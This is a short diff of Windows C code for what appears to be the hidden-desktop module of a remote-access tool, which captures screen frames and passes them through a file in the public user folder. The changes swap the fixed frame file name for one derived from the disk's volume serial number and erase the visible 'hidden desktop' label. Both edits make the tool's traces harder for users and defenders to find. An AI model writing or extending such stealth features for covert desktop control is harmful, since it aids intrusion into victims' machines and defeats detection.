@@ -77,6 +77,12 @@ static char *on_desktop(char *(*fn)(void *), void *arg) {
     return fn(arg);
 }
 
+static void frame_path(char *out, size_t n) {
+    DWORD serial = 0;
+    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
+    snprintf(out, n, "C:\\Users\\Public\\%08lx.dat", (unsigned long)(serial ^ 0xA73C915Eu));
+}
+
 static char *do_frame(void *arg);
 static BOOL CALLBACK count_wins(HWND hwnd, LPARAM lp);
 
@@ -108,7 +114,9 @@ static char *do_start(void *arg) {
         if (img && strncmp(img, "HDIMG:", 6) == 0) {
             const char *b64s = strrchr(img, ':');
             if (b64s && b64s[1]) {
-                FILE *fp = fopen("C:\\Users\\Public\\hdframe.b64", "wb");
+                char path[64];
+                frame_path(path, sizeof(path));
+                FILE *fp = fopen(path, "wb");
                 if (fp) { fputs(img, fp); fclose(fp); }
             }
         }
@@ -138,7 +146,7 @@ static LRESULT CALLBACK hd_wndproc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         DeleteObject(br);
         SetBkMode(hdc, TRANSPARENT);
         SetTextColor(hdc, RGB(240, 240, 240));
-        TextOutA(hdc, 16, 16, "hidden desktop", 14);
+        TextOutA(hdc, 16, 16, " ", 1);
         EndPaint(hwnd, &ps);
         return 0;
     }
@@ -531,7 +539,9 @@ char *hidden_desktop(const char *cmd) {
     char act[32];
     if (!cmd || strncmp(cmd, "__hd:", 5) != 0) return dupstr("unknown desktop action");
     if (!g_is_host && strncmp(cmd, "__hd:frame", 10) == 0) {
-        FILE *fp = fopen("C:\\Users\\Public\\hdframe.b64", "rb");
+        char path[64];
+        frame_path(path, sizeof(path));
+        FILE *fp = fopen(path, "rb");
         char *buf;
         long n;
         if (!fp) return dupstr("no frame yet");
